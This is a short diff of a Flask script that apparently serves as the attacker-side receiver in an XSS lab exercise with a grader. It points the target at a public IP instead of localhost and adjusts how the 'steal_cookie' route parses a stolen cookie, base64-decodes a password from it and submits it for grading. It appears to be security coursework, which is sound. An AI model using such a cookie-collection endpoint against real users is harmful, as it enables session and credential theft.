@@ -7,8 +7,8 @@ import sys
 sys.path.append("..")
 import grader
 
-TARGET_SERVER_ENDPOINT = 'http://localhost:1337'
-# TARGET_SERVER_ENDPOINT = 'http://35.225.46.109:80'
+# TARGET_SERVER_ENDPOINT = 'http://localhost:1337'
+TARGET_SERVER_ENDPOINT = 'http://35.225.46.109:80'
 
 app = Flask(__name__)
 
@@ -21,10 +21,10 @@ def steal_cookie(vuln_type):
     received_cookie = request.args.get('cookie', default='')
 
     # Reads the `cookie` parameter "password"
-    password_b64 = received_cookie.replace('%20', '').split(';')[1][9:]
+    password_b64 = received_cookie.split(';')[1][12:]
     password = base64.b64decode(password_b64)
 
-    grader.xss_verify(vuln_type, password) # Remember to decode the password.
+    grader.xss_verify(vuln_type, password)  # Remember to decode the password.
 
     return received_cookie
 
